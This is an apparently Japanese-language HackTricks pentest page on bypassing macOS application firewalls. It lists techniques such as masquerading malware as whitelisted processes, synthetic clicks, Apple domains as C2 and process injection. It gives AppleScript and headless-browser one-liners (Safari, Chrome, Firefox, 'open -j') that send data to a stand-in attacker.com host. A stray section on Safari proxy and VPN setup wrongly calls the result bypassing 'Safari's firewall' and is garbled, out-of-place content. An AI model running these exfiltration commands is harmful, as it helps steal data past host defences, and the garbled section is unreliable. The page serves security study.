# macOS ファイアウォールの回避方法

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 発見された技術

以下の技術は、一部のmacOSファイアウォールアプリで動作することが確認されました。

### ホワイトリスト名の悪用

* 例えば、マルウェアを**`launchd`**などのよく知られたmacOSプロセスの名前で呼び出す

### シンセティッククリック

* ファイアウォールがユーザーに許可を求める場合、マルウェアが**許可をクリック**する

### **Appleの署名済みバイナリの使用**

* **`curl`**のようなものだけでなく、**`whois`**なども

### よく知られたAppleのドメイン

ファイアウォールは、**`apple.com`**や**`icloud.com`**などのよく知られたAppleのドメインへの接続を許可しているかもしれません。そして、iCloudはC2として使用される可能性があります。

### 一般的なバイパス

ファイアウォールをバイパスするためのいくつかのアイデア

### 許可されたトラフィックの確認

許可されたトラフィックを知ることで、ホワイトリストに登録されている可能性のあるドメインや、それらにアクセスできるアプリケーションを特定することができます。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの乱用

DNSの解決は、おそらくDNSサーバーに接続することが許可されるであろう**`mdnsreponder`**という署名済みアプリケーションを介して行われます。

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ブラウザアプリを介して

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Safari

Safariは、macOSのデフォルトのウェブブラウザです。以下のテクニックを使用して、Safariのファイアウォールをバイパスすることができます。

## プロキシサーバーの使用

プロキシサーバーを使用することで、Safariのトラフィックをファイアウォールからバイパスすることができます。以下の手順に従って設定を行います。

1. システム環境設定を開きます。
2. ネットワークをクリックします。
3. 左下の「詳細」をクリックします。
4. 「プロキシ」タブを選択します。
5. 「Webプロキシ(HTTP)」と「セキュアWebプロキシ(HTTPS)」のチェックボックスを選択します。
6. プロキシサーバーのアドレスとポートを入力します。
7. 「認証が必要な場合」のオプションを選択し、必要な認証情報を入力します。

これにより、Safariのトラフィックは指定したプロキシサーバーを経由して送信され、ファイアウォールをバイパスすることができます。

## VPNの使用

VPN（仮想プライベートネットワーク）を使用することで、Safariのトラフィックを暗号化し、ファイアウォールをバイパスすることができます。以下の手順に従って設定を行います。

1. システム環境設定を開きます。
2. ネットワークをクリックします。
3. 左下の「詳細」をクリックします。
4. 「VPN」タブを選択します。
5. 「＋」ボタンをクリックして新しいVPN接続を作成します。
6. 接続の種類、サーバーアドレス、認証情報などを入力します。
7. 「認証が必要な場合」のオプションを選択し、必要な認証情報を入力します。

VPN接続を確立すると、SafariのトラフィックはVPN経由で送信され、ファイアウォールをバイパスすることができます。

これらのテクニックを使用することで、Safariのファイアウォールをバイパスし、制限なくウェブを閲覧することができます。ただし、これらの手法は法的な制約やプライバシーの問題に注意して使用する必要があります。
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

もし、**任意のサーバーに接続することが許可されているプロセスにコードをインジェクション**できれば、ファイアウォールの保護を回避することができます:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 参考文献

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
